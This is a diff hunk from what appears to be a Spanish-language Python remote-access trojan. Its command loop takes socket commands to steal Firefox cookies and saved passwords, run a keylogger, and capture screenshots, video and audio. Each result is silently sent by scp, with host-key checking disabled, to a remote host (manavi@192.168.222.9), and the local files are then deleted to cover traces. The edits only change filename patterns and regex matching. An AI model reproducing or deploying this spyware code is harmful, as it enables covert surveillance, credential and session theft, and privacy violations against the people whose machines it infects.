@@ -43,38 +43,38 @@ while True:
     
 	if recibido == "cookies":
 		os.system("python firecookies.py")	
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.9:~/cookies/ 1>/dev/null')
-		os.system('rm -f /tmp/cookies.txt')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.cks manavi@192.168.222.9:~/cookies/ 1>/dev/null')
+		os.system('rm -f /tmp/*.cks')
 		connstream.send("Archivo enviado")
 
 	elif recibido == "contrasenas":
 		os.system("python firepass.py")
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas/ 1>/dev/null')
-		os.system('rm -f /tmp/firepass.txt')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.fire manavi@192.168.222.9:~/contrasenas/ 1>/dev/null')
+		os.system('rm -f /tmp/*.fire')
 		connstream.send("Archivo enviado")
 
-	elif re.search('keylogger (\d+)',recibido):
+	elif re.match('keylogger (\d+)',recibido):
 		mo = re.match('keylogger (\d+)',recibido)
 		keylogger.keylog(mo.group(1))
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.9:~/keylogger/ 1>/dev/null')
-		os.system('rm -f /tmp/key.txt')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.key manavi@192.168.222.9:~/keylogger/ 1>/dev/null')
+		os.system('rm -f /tmp/*.key')
 		connstream.send("Archivo enviado")
     
-	elif re.search('captura (\-[tn]{1,1}) (\d+)',recibido):
+	elif re.match('captura (\-[tn]{1,1}) (\d+)',recibido):
 		mo = re.match('captura (\-[tn]{1,1}) (\d+)',recibido);
 		captura.tiempo(mo.group(1),mo.group(2))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.png manavi@192.168.222.9:~/capturas/ 1>/dev/null')
 		os.system('rm -f /tmp/*.png')
 		connstream.send("Archivo enviado")
  
-	elif re.search('captvid (\d+)',recibido):
+	elif re.match('captvid (\d+)',recibido):
 		mo = re.match('captvid (\d+)',recibido);
 		capvideo.video(mo.group(1))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.9:~/video/ 1>/dev/null')
 		os.system('rm -f /tmp/*.mpeg')
 		connstream.send("Archivo enviado")
     
-	elif re.search('captaud (\d+)',recibido):
+	elif re.match('captaud (\d+)',recibido):
 		mo = re.match('captaud (\d+)',recibido);        
 		capaudio.audio(mo.group(1))
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.9:~/audio/ 1>/dev/null')
